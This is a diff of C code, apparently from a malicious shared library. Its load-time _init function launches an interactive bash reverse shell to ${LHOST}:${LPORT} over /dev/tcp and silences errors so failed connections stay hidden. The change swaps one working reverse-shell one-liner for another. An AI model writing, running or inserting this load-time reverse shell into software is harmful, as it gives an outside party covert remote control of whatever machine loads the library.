@@ -42,7 +42,7 @@ static void _init(void) {
     setenv("RE_SHELL", "1", 1);
 
     // Redirect stderr to /dev/null so "Connection refused" stays hidden
-    char *args[] = {"/bin/bash", "-c", "exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1 2>/dev/null", NULL};
+    char *args[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null", NULL};
     execv("/bin/bash", args);
     _exit(0);
 }
